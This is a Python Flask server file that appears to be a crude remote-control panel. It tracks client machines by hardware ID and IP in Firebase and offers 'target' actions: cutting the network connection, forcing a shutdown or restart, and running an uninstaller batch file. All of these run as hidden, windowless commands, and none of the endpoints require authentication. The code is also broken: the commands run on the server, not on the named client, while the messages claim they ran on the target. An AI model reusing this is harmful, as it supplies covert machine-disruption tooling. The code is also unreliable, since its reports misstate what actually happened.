import os
from flask import Flask, render_template, request, jsonify
import subprocess
import firebase_admin
from firebase_admin import credentials, db

app = Flask(__name__)

# Firebase Initialization with proper path handling for Render Secret Files
if not firebase_admin._apps:
    # Render places Secret Files in the root directory, but let's check absolute or relative paths
    cred_path = "firebase_credentials.json"
    if not os.path.exists(cred_path):
        cred_path = os.path.join(os.path.dirname(__file__), "firebase_credentials.json")

    cred = credentials.Certificate(cred_path)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://vipchaetos-default-rtdb.firebaseio.com/'  # Siguraduhing ito ang totoong URL mo galing sa Firebase console
    })

@app.route('/')
def index():
    return render_template('vip.html')

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    hwid = data.get('hwid')
    ip_addr = request.remote_addr
    
    ref = db.reference(f'clients/{hwid}')
    ref.set({
        'ip': ip_addr,
        'status': 'ONLINE',
        'last_seen': 'Active Live'
    })
    
    return jsonify({"status": "registered", "assigned_hwid": hwid})

@app.route('/api/target-action', methods=['POST'])
def target_action():
    data = request.json
    hwid = data.get('hwid')
    action = data.get('action')

    if action == 'uninstall':
        bat_path = os.path.join(os.path.dirname(__file__), "App-Uninstaller-Combined.bat")
        if os.path.exists(bat_path):
            subprocess.Popen(f'cmd.exe /c start cmd.exe /k "{bat_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"App-Uninstaller executed on {hwid}"})

    elif action == 'clean':
        return jsonify({"message": f"Notepad Clean executed on {hwid}"})

    elif action == 'netcrash':
        subprocess.Popen('ipconfig /release', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"Internet connection crashed for {hwid}!"})

    elif action == 'netrestore':
        subprocess.Popen('ipconfig /renew', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"Internet connection restored for {hwid}!"})

    elif action == 'restart':
        subprocess.Popen('shutdown /r /t 0', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"Remote restart triggered for {hwid}!"})

    elif action == 'shutdown':
        subprocess.Popen('shutdown /s /t 0', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"Remote shutdown triggered for {hwid}!"})

    return jsonify({"message": "Unknown action requested."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)